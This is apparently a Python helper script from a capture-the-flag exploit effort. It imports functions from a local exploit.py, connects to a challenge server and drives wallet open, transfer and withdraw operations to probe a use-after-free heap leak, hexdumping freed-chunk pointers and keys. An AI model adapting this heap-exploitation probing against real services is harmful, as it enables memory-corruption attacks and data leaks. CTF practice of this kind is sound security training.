import sys, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "exploit.py")
ex = importlib.util.module_from_spec(spec); spec.loader.exec_module(ex)
R = ex.Remote; open_wallet = ex.open_wallet; transfer = ex.transfer
withdraw = ex.withdraw; deposit = ex.deposit; U64 = ex.U64


def hd(t, b):
    print(f"--- {t}")
    for i in range(0, len(b), 16):
        ch = b[i:i+16]
        print(f"  {i:#04x} {ch.hex(' ')}  {''.join(chr(c) if 32 <= c < 127 else '.' for c in ch)}")


r = R("chal.sunshinectf.games", 26004)
r.pump(1.5); r.expect(b">>>")
open_wallet(r, b"A", 48)
open_wallet(r, b"C", 48)
open_wallet(r, b"F", 48)
hd("C ledger before (expect zeros)", withdraw(r, 1, 48))
transfer(r, 0, 1)
hd("C ledger after free(X) (expect X fd/key)", withdraw(r, 1, 48))
transfer(r, 2, 1)
hd("C ledger after free(W)", withdraw(r, 1, 48))
hd("A slot0 ledger? (inactive)", b"")
print("=== F(2) ledger:", withdraw(r, 2, 48).hex())
